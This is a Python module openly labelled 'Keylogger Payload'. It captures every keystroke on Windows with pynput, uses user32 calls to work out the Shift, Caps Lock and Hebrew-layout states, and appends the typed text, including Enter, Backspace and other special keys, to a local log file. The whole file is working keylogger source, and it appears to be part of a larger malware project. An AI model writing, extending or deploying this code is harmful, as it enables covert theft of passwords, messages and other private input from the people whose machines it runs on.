"""
Module: Keylogger Payload 
Description: Captures and interprets raw hardware input signals.
             Uses low-level OS hooks (ctypes) strictly for input normalization
             (e.g., handling Caps Lock state, Shift modifiers, and Keyboard Layouts).
"""

import pynput.keyboard
from pynput.keyboard import Key
import config
import ctypes

HEBREW_MAP = {
    'q': '/', 'w': "'", 'e': 'ק', 'r': 'ר', 't': 'א', 'y': 'ט', 'u': 'ו', 'i': 'ן', 'o': 'ם', 'p': 'פ',
    'a': 'ש', 's': 'ד', 'd': 'ג', 'f': 'כ', 'g': 'ע', 'h': 'י', 'j': 'ח', 'k': 'ל', 'l': 'ך', ';': 'ף',
    'z': 'ז', 'x': 'ס', 'c': 'ב', 'v': 'ה', 'b': 'נ', 'n': 'מ', 'm': 'צ', ',': 'ת', '.': 'ץ', '/': '.'
}

class Keylogger:
    def __init__(self):
        self.log_file = config.LOG_FILE

    def append_to_log(self, key_string):
        """Appends captured data to the local text file using UTF-8."""
        with open(self.log_file, "a", encoding="utf-8") as file:
            file.write(key_string)

    def is_hebrew(self):
        """Checks if the active window is using a Hebrew Keyboard Layout (0x040D)."""
        try:
            # ctypes: The bridge library that allows Python to call C functions in the OS.
            # windll: A ctypes object used to load Windows-specific System Libraries (DLLs).
            # user32: The specific Windows DLL responsible for Windows, UI, and Inputs.
            user32 = ctypes.windll.user32
            
            # Get the window the user is currently looking at
            foreground_window = user32.GetForegroundWindow()
            if foreground_window == 0:
                return False
                
            # Get the ID of the process running in that window
            thread_id = user32.GetWindowThreadProcessId(foreground_window, 0)
            
            # We tell Python that the return value is a 64-bit number (unsigned long).
            # Without this, it might crash or return the wrong ID, because 64-bit is a very large number.
            user32.GetKeyboardLayout.restype = ctypes.c_ulong
            
            layout_id = user32.GetKeyboardLayout(thread_id)
            
            # Extract the language ID (last 16 bits). 0x040D is Hebrew.
            lang_id = layout_id & 0xFFFF
            return lang_id == 0x040D
            
        except Exception:
            #  assume English to stay safe.
            return False

    #0x14: Virtual Key code for Caps Lock.
    #Odd: Caps Lock is On, else Off
    def get_capslock_state(self):
        return ctypes.windll.user32.GetKeyState(0x14) & 1

    #0x10: Virtual Key Code for the Shift key
    #first bit On:Shift is being pressed
    #0x8000 is 1000 0000 0000 0000
    def get_shift_state(self):
        return ctypes.windll.user32.GetAsyncKeyState(0x10) & 0x8000

    def process_key_press(self, key):
        try:
            current_key = key.char
            if current_key is None: 
                return 

            # Check hardware states
            is_shift = self.get_shift_state()
            is_caps = self.get_capslock_state()
            is_hebrew_layout = self.is_hebrew()

            # Hebrew: 
            if is_hebrew_layout and not is_shift and current_key.lower() in HEBREW_MAP:
                current_key = HEBREW_MAP[current_key.lower()]
            
            # Uppercase:
            elif (is_shift and not is_caps) or (not is_shift and is_caps):
                current_key = current_key.upper()
            else:
                current_key = current_key.lower()

        except AttributeError:
            # special keys:
            if key == Key.space:
                current_key = " "
            elif key == Key.enter:
                current_key = " [ENTER]\n"
            elif key == Key.backspace:
                current_key = " [BACKSPACE] "
            
            # Ignore noise keys: 
            elif key in [Key.caps_lock, Key.shift, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r]:
                return
            
            else:
                # Log other special keys (like [tab] or [esc])
                current_key = f" [{str(key).replace('Key.', '')}] "
        
        self.append_to_log(current_key)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            keyboard_listener.join()#Waits here untill listener finishes his job(never)